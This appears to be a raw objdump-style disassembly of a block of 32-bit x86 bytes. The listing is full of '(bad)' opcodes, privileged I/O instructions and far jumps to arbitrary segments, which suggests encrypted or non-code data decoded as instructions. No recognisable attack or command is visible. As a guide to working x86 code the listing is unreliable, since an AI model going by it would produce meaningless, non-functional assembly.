  41a159:	aad    0xd
  41a15b:	mov    esi,0xd882aefc
  41a160:	(bad)  
  41a161:	fistp  DWORD PTR [edx]
  41a163:	outs   dx,BYTE PTR ds:[esi]
  41a164:	push   0xdff7b2b5
  41a169:	(bad)  [esi-0xc]
  41a16c:	inc    eax
  41a16d:	cwde   
  41a16e:	shl    esp,cl
  41a170:	or     DWORD PTR [edi],esp
  41a172:	jecxz  0x41a1f0
  41a174:	push   ebp
  41a175:	push   esi
  41a176:	je     0x41a1df
  41a178:	(bad)  
  41a179:	iret   
  41a17a:	sbb    cl,bh
  41a17c:	shl    esp,0x9d
  41a17f:	enter  0xa960,0xf6
  41a183:	adc    ecx,esi
  41a185:	dec    edi
  41a186:	arpl   WORD PTR [esi*1+0x5531289],bx
  41a18d:	outs   dx,DWORD PTR ds:[esi]
  41a18e:	sbb    al,0x30
  41a190:	push   ebp
  41a191:	mov    esp,0xd80ba521
  41a196:	cmp    al,0xce
  41a198:	push   esi
  41a199:	mov    ecx,0x9b4eac40
  41a19e:	mov    ebp,0x3f397436
  41a1a3:	xor    cl,BYTE PTR [edx-0x63]
  41a1a6:	dec    edx
  41a1a7:	cwde   
  41a1a8:	or     eax,0xdfd37c54
  41a1ad:	pop    ebx
  41a1ae:	dec    edi
  41a1af:	loopne 0x41a1d2
  41a1b1:	mov    bh,0x1
  41a1b3:	mov    BYTE PTR ds:0x97d3a591,bh
  41a1b9:	out    dx,eax
  41a1ba:	aas    
  41a1bb:	arpl   WORD PTR [ebp+0x3c],bp
  41a1be:	call   0xe2a2:0x683a28ff
  41a1c5:	sub    DWORD PTR [edi+0xe7fc2ab],0xffffffb3
  41a1cc:	push   ecx
  41a1cd:	mov    DWORD PTR [edi+edi*1],ebx
  41a1d0:	mov    ecx,0xf74af808
  41a1d5:	pushf  
  41a1d6:	mov    ds,WORD PTR [eax]
  41a1d8:	stos   BYTE PTR es:[edi],al
  41a1d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1da:	push   ss
  41a1db:	gs jae 0x41a1d5
  41a1de:	into   
  41a1df:	icebp  
  41a1e0:	repnz mov bh,0x1e
  41a1e3:	ror    BYTE PTR [ebx-0x7560dfee],0x14
  41a1ea:	jecxz  0x41a1c2
  41a1ec:	mov    cl,0xa1
  41a1ee:	outs   dx,DWORD PTR ds:[esi]
  41a1ef:	lds    ebx,FWORD PTR [edi+0x78]
  41a1f2:	(bad)  
  41a1f3:	loope  0x41a1f2
  41a1f5:	mov    dl,0x5b
  41a1f7:	cmp    eax,0xe12bd226
  41a1fc:	push   edx
  41a1fd:	fwait
  41a1fe:	sbb    esi,edx
  41a200:	mov    ch,0xc8
  41a202:	inc    ebp
  41a203:	sub    esp,ecx
  41a205:	push   ds
  41a206:	pop    eax
  41a207:	ins    DWORD PTR es:[edi],dx
  41a208:	mov    al,ds:0xc9a0b17c
  41a20d:	gs cwde 
  41a20f:	loope  0x41a1dd
  41a211:	adc    ebx,DWORD PTR [eax+esi*2-0x7fa9e31d]
  41a218:	inc    ebx
  41a219:	push   ebx
  41a21a:	xor    BYTE PTR [edx+0x9c8388c],ah
  41a220:	push   ecx
  41a221:	mov    ebx,0xdd64de46
  41a226:	out    0x2b,eax
  41a228:	jmp    0x9a69:0x4e39151d
  41a22f:	inc    edi
  41a230:	enter  0xd7a0,0x64
  41a234:	outs   dx,BYTE PTR ds:[esi]
  41a235:	mov    ecx,gs
  41a237:	jae    0x41a2b5
  41a239:	add    eax,0xd2c14c50
  41a23e:	std    
  41a23f:	ss das 
  41a241:	imul   ebp,DWORD PTR [ecx+ebp*8+0x5e256cad],0x7c
  41a249:	aam    0x81
  41a24b:	mov    esp,0xd5f77bfd
  41a250:	jge    0x41a244
  41a252:	pop    es
  41a253:	and    ch,BYTE PTR [eax]
  41a255:	add    BYTE PTR [ebx+edx*8],cl
  41a258:	adc    cl,BYTE PTR ds:0x9d343c18
  41a25e:	jmp    0xbc01:0x7384783f
  41a265:	fdivp  st(1),st
  41a267:	fwait
  41a268:	in     al,dx
  41a269:	and    eax,0x705927f6
  41a26e:	xchg   esi,eax
  41a26f:	fistp  WORD PTR [ecx]
  41a271:	jno    0x41a2e6
  41a273:	pushf  
  41a274:	lods   al,BYTE PTR ds:[esi]
  41a275:	shl    DWORD PTR [ebx+0x66],0x81
  41a279:	sbb    DWORD PTR ds:[ebx+0x58d39827],edi
  41a280:	mov    ?,WORD PTR [ebx+0x5]
  41a283:	mov    ss,ecx
  41a285:	mov    BYTE PTR [eax-0xb9e4431],dl
  41a28b:	mov    ebx,0xd23dbc7e
  41a290:	(bad)  
  41a291:	inc    esp
  41a292:	ja     0x41a291
  41a294:	push   es
  41a295:	pop    esi
  41a296:	push   ss
  41a297:	add    eax,0x6694caab
  41a29c:	sub    DWORD PTR [edi],ebp
  41a29e:	jns    0x41a302
  41a2a0:	mov    bh,0xec
  41a2a2:	mov    ?,WORD PTR [edx-0x4c]
  41a2a5:	sbb    BYTE PTR [ebx],ch
  41a2a7:	inc    esp
  41a2a8:	fisubr DWORD PTR [edx+edx*1-0x3275f8be]
  41a2af:	xchg   BYTE PTR [ebx+eax*2],ch
  41a2b2:	lods   eax,DWORD PTR ds:[esi]
  41a2b3:	aad    0x6f
  41a2b5:	leave  
  41a2b6:	hlt    
  41a2b7:	jmp    0x41a2f5
  41a2b9:	(bad)  
  41a2ba:	add    DWORD PTR es:[ebx+ebp*2+0x1a],ebp
  41a2bf:	pop    edx
  41a2c0:	cld    
  41a2c1:	dec    eax
  41a2c2:	adc    al,0x61
  41a2c4:	xchg   ecx,eax
  41a2c5:	cld    
  41a2c6:	retf   0x1fba
  41a2c9:	mov    WORD PTR [edi+edx*2],es
  41a2cc:	cdq    
  41a2cd:	cdq    
  41a2ce:	dec    ecx
  41a2cf:	lods   al,BYTE PTR ds:[esi]
  41a2d0:	mov    bh,0xf6
  41a2d2:	and    ch,BYTE PTR [ecx]
  41a2d4:	ret    0xbbe5
  41a2d7:	cmp    ecx,DWORD PTR [edx+edx*2]
  41a2da:	xchg   esp,eax
  41a2db:	or     DWORD PTR [edx+0x76],ebp
  41a2de:	arpl   WORD PTR [eax-0x37],sp
  41a2e1:	sub    cl,dh
  41a2e3:	and    eax,0x3c8ff179
  41a2e8:	push   ds
  41a2e9:	or     eax,0x605fc816
  41a2ee:	icebp  
  41a2ef:	fild   WORD PTR [ecx]
  41a2f1:	call   0x5ac2:0x8037042b
  41a2f8:	jno    0x41a35c
  41a2fa:	mov    dl,0x70
  41a2fc:	inc    ebp
  41a2fd:	dec    ebp
  41a2fe:	mul    DWORD PTR [ecx]
  41a300:	retf   0x6235
  41a303:	retf   0xbbea
  41a306:	out    0xf4,al
  41a308:	add    esp,DWORD PTR [ebx+0x471b4da6]
  41a30e:	jnp    0x41a2e5
  41a310:	add    al,0x25
  41a312:	jmp    0x3b37e71
  41a317:	(bad)
  41a31a:	cmp    ebp,ebp
  41a31c:	out    dx,eax
  41a31d:	ret    
  41a31e:	push   esp
  41a31f:	xor    ebx,ebp
  41a321:	pop    edx
  41a322:	mov    ebx,0xaf67017
  41a327:	push   ebx
  41a328:	pop    ss
  41a329:	mov    dh,0x29
  41a32b:	cmp    DWORD PTR [esi],ecx
  41a32d:	cmp    BYTE PTR [ebx+0x441fc0d0],cl
  41a333:	xchg   edi,eax
  41a334:	sub    BYTE PTR [esi],bh
  41a336:	mov    bh,0x38
  41a338:	and    BYTE PTR [edx],bh
  41a33a:	(bad)  
  41a33b:	sbb    eax,0x57e9029d
  41a340:	lods   al,BYTE PTR ds:[esi]
  41a341:	jmp    0x476fe04a
  41a346:	int3   
  41a347:	es cmp ecx,ebp
  41a34a:	hlt    
  41a34b:	mov    esi,DWORD PTR [esi-0x1b2b5a77]
  41a351:	mov    ds:0x445115f8,al
  41a356:	enter  0x6d50,0x68
  41a35a:	out    dx,eax
  41a35b:	call   0x8a52:0x89332d51
  41a362:	dec    ebp
  41a363:	aam    0x86
  41a365:	mov    cs,edi
  41a367:	mov    dh,0x77
  41a369:	scas   eax,DWORD PTR es:[edi]
  41a36a:	or     eax,0x1b37ea1d
  41a36f:	inc    edi
  41a370:	mov    dl,0x4d
  41a372:	jmp    0xedf44298
  41a377:	sar    BYTE PTR [eax],cl
  41a379:	not    BYTE PTR [esi+0x43]
  41a37c:	(bad)  
  41a37e:	int3   
  41a37f:	push   ss
  41a380:	arpl   bx,si
  41a382:	xchg   ecx,eax
  41a383:	and    BYTE PTR [esi],cl
  41a385:	mov    ah,0xaf
  41a387:	dec    esp
  41a388:	jae    0x41a338
  41a38a:	loopne 0x41a33b
  41a38c:	xor    DWORD PTR [edx+0x1c694237],ecx
  41a392:	inc    ebp
  41a393:	mov    bh,0xf9
  41a395:	scas   al,BYTE PTR es:[edi]
  41a396:	in     al,0xc7
  41a398:	add    al,0x69
  41a39a:	jo     0x41a35e
  41a39c:	jmp    0x88dc9e0e
  41a3a1:	mov    dl,BYTE PTR [edx+0x58]
  41a3a4:	pop    esp
  41a3a5:	sub    esi,DWORD PTR [ebp+0x7e]
  41a3a8:	sbb    BYTE PTR [ebp-0x452b27d1],bh
  41a3ae:	jno    0x41a354
  41a3b0:	cmp    ch,BYTE PTR ds:[edi]
  41a3b3:	dec    esp
  41a3b4:	mov    ecx,eax
  41a3b6:	ins    DWORD PTR es:[edi],dx
  41a3b7:	dec    ecx
  41a3b8:	test   al,0xc6
  41a3ba:	sbb    dh,BYTE PTR [edi+edx*1]
  41a3bd:	mov    dl,0xae
  41a3bf:	(bad)  
  41a3c0:	xchg   di,ax
  41a3c2:	jle    0x41a3fc
  41a3c4:	in     al,dx
  41a3c5:	stc    
  41a3c6:	es test eax,0xa8a19230
  41a3cc:	pop    esp
  41a3cd:	push   esi
  41a3ce:	lds    esi,FWORD PTR [edi-0x68]
  41a3d1:	add    eax,0x597718b5
  41a3d6:	push   eax
  41a3d7:	fmulp  st(0),st
  41a3d9:	sub    eax,0xf60959b6
  41a3de:	mov    eax,0xa44894d2
  41a3e3:	imul   edi,DWORD PTR [esi],0x1e2db150
  41a3e9:	or     al,0xe5
  41a3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ec:	pop    esi
  41a3ed:	lea    edx,ds:0x40d4dc5b
  41a3f3:	inc    edx
  41a3f4:	mov    ch,0x73
  41a3f6:	pushf  
  41a3f7:	inc    edx
  41a3f8:	adc    al,0x8
  41a3fa:	pop    ds
  41a3fb:	inc    ebp
  41a3fc:	repnz mov dh,0xb6
  41a3ff:	dec    ebx
  41a400:	xor    DWORD PTR [ebx],eax
  41a402:	imul   esi,esp,0x1c70166a
  41a408:	(bad)  
  41a40a:	pushf  
  41a40b:	call   0x63203893
  41a410:	add    DWORD PTR [ecx+ecx*1],edi
  41a413:	loopne 0x41a47f
  41a415:	sub    DWORD PTR [ebx],edi
  41a417:	fnsave [esi+eax*1+0x764e2102]
  41a41e:	(bad)  
  41a41f:	xchg   esi,eax
  41a420:	aad    0x3d
  41a422:	mov    BYTE PTR [ecx+ebx*8-0x2f6b9036],dh
  41a429:	cmova  ebp,DWORD PTR [esi+0xf3ad54]
  41a430:	mov    esp,0xfd572926
  41a435:	clc    
  41a436:	inc    BYTE PTR [eax]
  41a438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a439:	and    BYTE PTR [eax-0x2a],0x83
  41a43d:	mov    al,ds:0x3d11754
  41a442:	sahf   
  41a443:	add    eax,0xf2db8429
  41a448:	xor    eax,DWORD PTR fs:[esi]
  41a44b:	sub    cl,ch
  41a44d:	nop
  41a44e:	rcl    DWORD PTR [edi+edx*4+0x68],1
  41a452:	lods   al,BYTE PTR ds:[esi]
  41a453:	mov    bl,0xb0
  41a455:	aam    0x40
  41a457:	sub    DWORD PTR [ecx+0x6c],0xffffffe2
  41a45b:	add    bh,cl
  41a45d:	xchg   edx,eax
  41a45e:	sar    al,cl
  41a460:	dec    esp
  41a461:	rol    DWORD PTR [ebp-0x25],0x19
  41a465:	xchg   DWORD PTR [esi],edx
  41a467:	adc    edi,ecx
  41a469:	stos   BYTE PTR es:[edi],al
  41a46a:	icebp  
  41a46b:	xchg   ebp,eax
  41a46c:	pop    esp
  41a46d:	mov    edi,0x3f34a53b
  41a472:	push   edi
  41a473:	jmp    0x41a46a
  41a475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a476:	test   BYTE PTR [esi+edi*1-0x6bda3ba2],al
  41a47d:	fwait
  41a47e:	xchg   esi,eax
  41a47f:	js     0x41a4fd
  41a481:	fcomp  DWORD PTR [edx]
  41a483:	jecxz  0x41a42a
  41a485:	xor    eax,0x65df2abf
  41a48a:	pop    edx
  41a48b:	retf   0x98b9
  41a48e:	into   
  41a48f:	sbb    BYTE PTR [edx],ah
  41a491:	add    dl,BYTE PTR [edi-0x25]
  41a494:	call   0x59e1:0x1c59967f
  41a49b:	je     0x41a45c
  41a49d:	rcr    BYTE PTR [esi-0x482725e5],cl
  41a4a3:	adc    eax,ebp
  41a4a5:	lahf   
  41a4a6:	and    DWORD PTR [edx-0x6eb91c00],ebx
  41a4ac:	nop
  41a4ad:	jle    0x41a50a
  41a4af:	push   ebx
  41a4b0:	call   DWORD PTR [eax-0x49]
  41a4b3:	sub    ah,al
  41a4b5:	xor    eax,0xa53957c7
  41a4ba:	and    eax,0x1aca26e1
  41a4bf:	les    esi,FWORD PTR [ecx]
  41a4c1:	in     al,0x70
  41a4c3:	pop    ds
  41a4c4:	mov    edx,0x392a1d20
  41a4c9:	xor    DWORD PTR [ebx+0x3a],ecx
  41a4cc:	mov    ebp,edx
  41a4ce:	add    esi,DWORD PTR [edx+0xcc6d57a]
  41a4d4:	and    edx,0xbf87ae9b
  41a4da:	xor    al,0x33
  41a4dc:	stos   DWORD PTR es:[edi],eax
  41a4dd:	fsubr  QWORD PTR [ecx+0x1e]
  41a4e0:	ror    BYTE PTR [edi],cl
  41a4e2:	retf   0x1557
  41a4e5:	dec    ecx
  41a4e6:	dec    esi
  41a4e7:	push   eax
  41a4e8:	sbb    dh,BYTE PTR [edi+0x22bebf96]
  41a4ee:	aas    
  41a4ef:	jmp    0x57c76d05
  41a4f4:	loop   0x41a527
  41a4f6:	xor    BYTE PTR [esi-0x69],cl
  41a4f9:	mov    ecx,0xe8a52485
  41a4fe:	std    
  41a4ff:	lods   al,BYTE PTR ds:[esi]
  41a500:	mov    eax,ds:0xeb55476e
  41a505:	(bad)  
  41a506:	aad    0x26
  41a508:	inc    esp
  41a509:	sub    eax,0x3f75992f
  41a50e:	cld    
  41a50f:	inc    ecx
  41a510:	imul   edx,DWORD PTR [edx+0x57],0xbf04e041
  41a517:	mov    ecx,0x65c72476
  41a51c:	mov    ah,0x47
  41a51e:	push   ecx
  41a51f:	dec    ecx
  41a520:	daa    
  41a521:	cmp    BYTE PTR [esi],0xdd
  41a524:	das    
  41a525:	(bad)  
  41a526:	xchg   ebp,eax
  41a527:	push   es
  41a528:	mov    bl,BYTE PTR [esi-0x3a6c69ca]
  41a52e:	pop    edx
  41a52f:	dec    edx
  41a530:	push   0xe82dcaba
  41a535:	lock lock mov al,ds:0xc28f412c
  41a53c:	repz mov ebp,0x54e4ccc8
  41a542:	out    0x68,al
  41a544:	mov    eax,ds:0xa932ce31
  41a549:	inc    edi
  41a54a:	mov    ss,WORD PTR [edi-0x6705d1f7]
  41a550:	xchg   esi,eax
  41a551:	pop    ss
  41a552:	sbb    eax,0x10a14e09
  41a557:	mov    edi,0x377ae65
  41a55c:	add    BYTE PTR [ecx+eiz*1],ah
  41a55f:	inc    edx
  41a560:	pushf  
  41a561:	ret    0xbd03
  41a564:	and    BYTE PTR [esi-0x10],dh
  41a567:	jmp    0xcba6:0xc5c10d9e
  41a56e:	daa    
  41a56f:	dec    edi
  41a570:	mov    bl,0x1f
  41a572:	js     0x41a559
  41a574:	fistp  DWORD PTR [eax]
  41a576:	adc    edx,DWORD PTR [edi+eiz*4]
  41a579:	adc    esi,0xbf6b4282
  41a57f:	call   0x4600:0xf31e518f
  41a586:	cld    
  41a587:	push   ebx
  41a588:	mov    al,0x1e
  41a58a:	or     bl,bh
  41a58c:	dec    esi
  41a58d:	aas    
  41a58e:	lods   al,BYTE PTR ds:[esi]
  41a58f:	fadd   DWORD PTR [esi+0x44abbfad]
  41a595:	mov    ?,edx
  41a597:	xchg   ecx,eax
  41a598:	xlat   BYTE PTR ds:[ebx]
  41a599:	xor    esp,DWORD PTR [edi]
  41a59b:	loop   0x41a5a6
  41a59d:	mov    bh,0x7
  41a59f:	test   al,0x57
  41a5a1:	adc    eax,0xa521ef53
  41a5a6:	mov    ebx,0xd905c10f
  41a5ab:	repnz loop 0x41a593
  41a5ae:	xchg   esp,eax
  41a5af:	inc    ecx
  41a5b0:	in     al,0x95
  41a5b2:	cwde   
  41a5b3:	pop    edi
  41a5b4:	scas   al,BYTE PTR es:[edi]
  41a5b5:	inc    ebx
  41a5b6:	cwde   
  41a5b7:	cwde   
  41a5b8:	shl    BYTE PTR [eax-0x6c3c1ae9],0xb9
  41a5bf:	xor    ah,BYTE PTR [esi]
  41a5c1:	mov    al,ds:0xe7b09cfb
  41a5c6:	or     DWORD PTR [edx-0x5b],0xcf2cde19
  41a5cd:	sbb    BYTE PTR [edi-0x6b],bh
  41a5d0:	cmp    eax,0x7ef68514
  41a5d5:	or     edx,0x6a
  41a5d8:	and    al,0x20
  41a5db:	push   ecx
  41a5dc:	popa   
  41a5dd:	and    eax,0x99867a53
  41a5e2:	adc    edx,ebp
  41a5e4:	sbb    dh,bh
  41a5e6:	fcomp  DWORD PTR [esi-0x28e8538b]
  41a5ec:	imul   ebx,DWORD PTR [esi],0xb18798ad
  41a5f2:	sub    bh,BYTE PTR [eax-0x509fdded]
  41a5f8:	enter  0xc9e8,0xa0
  41a5fc:	jle    0x41a5c7
  41a5fe:	retf   
  41a5ff:	es sbb eax,0xb6527d10
  41a605:	sbb    esi,DWORD PTR fs:[ebx-0x6a45918c]
  41a60c:	sahf   
  41a60d:	xchg   DWORD PTR [esi-0x40],edi
  41a610:	cmp    eax,0x112d04ed
  41a615:	ins    BYTE PTR es:[edi],dx
  41a616:	iret   
  41a617:	inc    ebx
  41a618:	push   es
  41a619:	clc    
  41a61a:	add    ebp,eax
  41a61c:	push   ss
  41a61d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a61e:	fbstp  TBYTE PTR [edi]
  41a620:	jmp    0x466:0x4475793d
  41a627:	(bad)  
  41a629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62a:	pop    esp
  41a62b:	lock push esi
  41a62d:	ret    0x51e5
  41a630:	lock inc edx
  41a632:	es push ecx
  41a634:	sbb    eax,0x6fe8e0a3
  41a639:	int3   
  41a63a:	add    eax,0xa42c0ea9
  41a63f:	stos   BYTE PTR es:[edi],al
  41a640:	enter  0xbfa7,0xe0
  41a644:	ret    0x7b2d
  41a647:	push   esi
  41a648:	cmp    dh,ah
  41a64a:	nop
  41a64b:	adc    BYTE PTR [esi+ecx*2],dl
  41a64e:	test   eax,0x597788b4
  41a653:	push   ecx
  41a654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a655:	std    
  41a656:	jge    0x41a672
  41a658:	test   DWORD PTR [ecx],edx
  41a65a:	fs inc edi
  41a65c:	fs fcmove st,st(6)
  41a65f:	xor    esi,DWORD PTR [esi]
  41a661:	ins    BYTE PTR es:[edi],dx
  41a662:	push   esi
  41a663:	ins    DWORD PTR es:[edi],dx
  41a664:	mov    gs,WORD PTR [ecx-0x7b69f039]
  41a66a:	scas   eax,DWORD PTR es:[edi]
  41a66b:	mov    edx,gs
  41a66d:	adc    esp,edx
  41a66f:	aad    0x8b
  41a671:	cmp    DWORD PTR [esi+0x74a87573],0x82a90d05
  41a67b:	das    
  41a67c:	shl    BYTE PTR [ebp+edx*2-0x71],1
  41a680:	cdq    
  41a681:	push   0x47
  41a683:	leave  
  41a684:	cmp    ecx,esi
  41a686:	xor    ch,ch
  41a688:	out    dx,al
  41a689:	sbb    DWORD PTR [ebp+0x7d],esi
  41a68c:	pop    ebx
  41a68d:	xchg   ebx,eax
  41a68e:	xor    ah,BYTE PTR [eax-0x76bdeb1f]
  41a694:	ss push edi
  41a696:	nop
  41a697:	push   edx
  41a698:	out    0x22,eax
  41a69a:	push   esi
  41a69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a69c:	daa    
  41a69d:	mov    dh,0xfb
  41a69f:	sub    eax,0xfae8ce9d
  41a6a4:	push   bp
  41a6a6:	lods   al,BYTE PTR ds:[esi]
  41a6a7:	jmp    0x41a719
  41a6a9:	sbb    BYTE PTR [esi-0x2360829f],ah
  41a6af:	loop   0x41a645
  41a6b1:	(bad)  
  41a6b2:	mov    al,ds:0xdfc3456
  41a6b7:	mov    esi,0xfde09aac
  41a6bc:	jmp    0xfdd9b4ce
  41a6c1:	pop    es
  41a6c2:	sbb    DWORD PTR ds:0x47840ba,ebx
  41a6c8:	jbe    0x41a656
  41a6ca:	mov    al,ds:0xfe0d3e9e
  41a6cf:	es and eax,0xabdc23c2
  41a6d5:	clc    
  41a6d6:	mov    al,0x49
  41a6d8:	cmp    eax,0xd94e744a
  41a6dd:	les    esp,FWORD PTR [edx-0x29]
  41a6e0:	pop    ecx
  41a6e1:	xchg   BYTE PTR [esi],bl
  41a6e3:	mov    ah,0xd6
  41a6e5:	es pop es
  41a6e7:	addr16 dec esp
  41a6e9:	rep lods al,BYTE PTR ds:[esi]
  41a6eb:	xor    cl,BYTE PTR [ecx]
  41a6ed:	cwde   
  41a6ee:	adc    BYTE PTR [eax-0x3b135695],bl
  41a6f4:	out    0xcf,eax
  41a6f6:	lock jno 0x41a6e1
  41a6f9:	adc    BYTE PTR [ecx+eax*4+0x6783f112],ch
  41a700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a701:	outs   dx,DWORD PTR ds:[esi]
  41a702:	(bad)  
  41a703:	or     eax,0xf08802c8
  41a708:	push   0xffffffa8
  41a70a:	pop    esi
  41a70b:	adc    eax,0x63b9555a
  41a710:	cbw    
  41a712:	imul   ebp,DWORD PTR [ecx-0x104270b1],0xd0aa84aa
  41a71c:	jp     0x41a6c0
  41a71e:	cld    
  41a71f:	inc    esp
  41a720:	frstor ds:0x605f7773
  41a726:	adc    DWORD PTR [edx+eiz*1+0x1e],eax
  41a72a:	mov    ds:0x287c3907,al
  41a72f:	and    dl,dh
  41a731:	xchg   edi,eax
  41a732:	fs pop ebx
  41a734:	jno    0x41a704
  41a736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a737:	jae    0x41a6c9
  41a739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a73a:	loope  0x41a79c
  41a73c:	arpl   WORD PTR [eax],bp
  41a73e:	scas   al,BYTE PTR es:[edi]
  41a73f:	adc    ah,0x85
  41a742:	add    al,0x7c
  41a744:	mov    ecx,0xf6ce562
  41a749:	out    0xcc,eax
  41a74b:	rcl    BYTE PTR [ebx],0xba
  41a74e:	(bad)  
  41a74f:	push   ebp
  41a750:	(bad)  [ecx]
  41a752:	pop    es
  41a753:	int3   
  41a754:	pop    ebx
  41a755:	mov    dh,0xdd
  41a757:	jbe    0x41a7b7
  41a759:	in     eax,dx
  41a75a:	lahf   
  41a75b:	arpl   WORD PTR [ebp+0x6912a7b4],si
  41a761:	xchg   esp,eax
  41a762:	aaa    
  41a763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a764:	(bad)  
  41a765:	xchg   ebp,eax
  41a766:	mov    BYTE PTR [eax+0x32],ah
  41a769:	mov    esi,0xfcdf28b5
  41a76e:	add    BYTE PTR [ebp+0x18],bh
  41a771:	ins    DWORD PTR es:[edi],dx
  41a772:	push   ecx
  41a773:	fisub  DWORD PTR [edx]
  41a775:	push   esi
  41a776:	sbb    eax,0x35cf9d1a
  41a77b:	hlt    
  41a77c:	cli    
  41a77d:	and    DWORD PTR [ecx-0x6ad020ab],0xedd40e97
  41a787:	dec    ebx
  41a788:	add    DWORD PTR [ecx-0x79],ebp
  41a78b:	inc    esi
  41a78c:	mov    edx,0x38568a9e
  41a791:	(bad)  
  41a792:	(bad)  
  41a793:	xchg   ebx,eax
  41a794:	test   eax,0xc78214ad
  41a799:	popf   
  41a79a:	jp     0x41a7e3
  41a79c:	scas   eax,DWORD PTR es:[edi]
  41a79d:	cwde   
  41a79e:	mov    ds:0x38aac50,al
  41a7a3:	adc    BYTE PTR [ebp-0x157a1316],al
  41a7a9:	mov    ds:0x51760571,eax
  41a7ae:	fwait
  41a7af:	call   0x8d29a12b
  41a7b4:	cmp    cl,BYTE PTR ds:0x15e62a6d
  41a7ba:	inc    esi
  41a7bb:	aad    0x80
  41a7bd:	push   ecx
  41a7be:	fnstcw WORD PTR [edi-0x43]
  41a7c1:	ret    
  41a7c2:	xor    DWORD PTR [ebx-0x6],ebx
  41a7c5:	or     BYTE PTR [ecx+ecx*2-0x248cb113],ah
  41a7cc:	gs sbb bh,dh
  41a7cf:	adc    esp,DWORD PTR [edx+0x41]
  41a7d2:	sbb    DWORD PTR [ebx+0x5d],esi
  41a7d5:	pop    ecx
  41a7d6:	fadd   st(2),st
  41a7d8:	push   edx
  41a7d9:	rol    BYTE PTR [ecx+0x7a41cd37],cl
  41a7df:	sub    eax,0x6ecc3f9a
  41a7e4:	enter  0xdf74,0x37
  41a7e8:	stc    
  41a7e9:	mov    al,ds:0xb1a8c0c6
  41a7ee:	bound  eax,QWORD PTR [ecx+0x46]
  41a7f1:	dec    eax
  41a7f2:	cld    
  41a7f3:	retf   0x3238
  41a7f6:	int    0x83
  41a7f8:	sub    DWORD PTR ds:[edi-0x35],edi
  41a7fc:	adc    DWORD PTR [edx+0x0],edx
  41a7ff:	mov    edi,0x99474532
  41a804:	outs   dx,DWORD PTR ds:[esi]
  41a805:	mov    ebx,0xfcee67ee
  41a80a:	ret    
  41a80b:	into   
  41a80c:	outs   dx,WORD PTR ds:[esi]
  41a80e:	xlat   BYTE PTR ds:[ebx]
  41a80f:	sub    ebx,ebx
  41a811:	adc    bl,BYTE PTR [edx+ebx*2-0x31e130fc]
  41a818:	add    al,0x40
  41a81a:	inc    ebx
  41a81b:	shr    DWORD PTR [ebx+0x58],cl
  41a81e:	or     al,0x91
  41a820:	pop    ss
  41a821:	cdq    
  41a822:	jge    0x41a890
  41a824:	outs   dx,BYTE PTR ds:[esi]
  41a825:	add    ecx,ecx
  41a827:	dec    BYTE PTR [esi-0x2b378b6d]
  41a82d:	sbb    DWORD PTR [ebx-0x2],esi
  41a830:	dec    eax
  41a831:	stos   DWORD PTR es:[edi],eax
  41a832:	retf   
  41a833:	inc    ecx
  41a834:	ins    BYTE PTR es:[edi],dx
  41a835:	sbb    DWORD PTR [ebp-0x33ce7b2f],edi
  41a83b:	mov    al,0xc7
  41a83d:	(bad)  [ecx+0x474b124f]
  41a843:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41a845:	add    al,0xa4
  41a847:	fsub   st,st(4)
  41a849:	dec    esi
  41a84a:	std    
  41a84b:	imul   cl
  41a84d:	(bad)  
  41a84e:	fsubr  QWORD PTR [edi+0x58]
  41a851:	add    bl,BYTE PTR [ebx-0x2893bfb3]
  41a857:	push   edx
  41a858:	or     esi,ebp
  41a85a:	fistp  WORD PTR [edx+0x68829a6]
  41a860:	addr16 (bad) 
  41a862:	fwait
  41a863:	xchg   esp,eax
  41a864:	popa   
  41a865:	call   0xb03:0x1ea63cf5
  41a86c:	(bad)  
  41a86e:	je     0x41a834
  41a870:	mov    dl,BYTE PTR [edx]
  41a872:	inc    ebp
  41a873:	icebp  
  41a874:	cmp    al,ah
  41a876:	test   DWORD PTR [ecx-0x52],edi
  41a879:	lea    esi,[esi]
  41a87b:	ins    BYTE PTR es:[edi],dx
  41a87c:	imul   edx,DWORD PTR [edx+esi*1+0x54e0243f],0x21
  41a884:	out    dx,al
  41a885:	nop
  41a886:	stos   DWORD PTR es:[edi],eax
  41a887:	out    dx,al
  41a888:	or     al,0xc1
  41a88a:	mov    dl,BYTE PTR [ebp-0x50]
  41a88d:	and    ecx,DWORD PTR ds:0x95a7f51e
  41a893:	jnp    0x41a862
  41a895:	dec    edi
  41a896:	icebp  
  41a897:	shl    DWORD PTR ds:0x257394a6,1
  41a89d:	xchg   edi,eax
  41a89e:	mov    bh,0x69
  41a8a0:	(bad)  
  41a8a1:	xor    eax,0x55244ec4
  41a8a6:	rcl    dh,1
  41a8a8:	mov    esi,0x63d0e834
  41a8ad:	push   0x6ad68ab9
  41a8b2:	aaa    
  41a8b3:	xlat   BYTE PTR ds:[ebx]
  41a8b4:	leave  
  41a8b5:	mov    dh,0xff
  41a8b7:	jmp    0xec47:0xd088dd35
  41a8be:	jae    0x41a8d6
  41a8c0:	sbb    dl,cl
  41a8c2:	imul   eax,DWORD PTR [ebx+0x56],0x67d5365d
  41a8c9:	(bad)  
  41a8ca:	cmp    al,0x4a
  41a8cc:	mov    eax,0xcf51ffe0
  41a8d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8d2:	xor    edi,eax
  41a8d4:	sahf   
  41a8d5:	mov    ecx,0xe84b404d
  41a8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8db:	add    dh,BYTE PTR [edx+0x142a5b66]
  41a8e1:	fcomp  DWORD PTR [edi]
  41a8e3:	clc    
  41a8e4:	xor    ebp,DWORD PTR [esi]
  41a8e6:	js     0x41a951
  41a8e8:	push   ebx
  41a8e9:	push   0x25fe7876
  41a8ee:	pop    ebx
  41a8ef:	ds in  al,dx
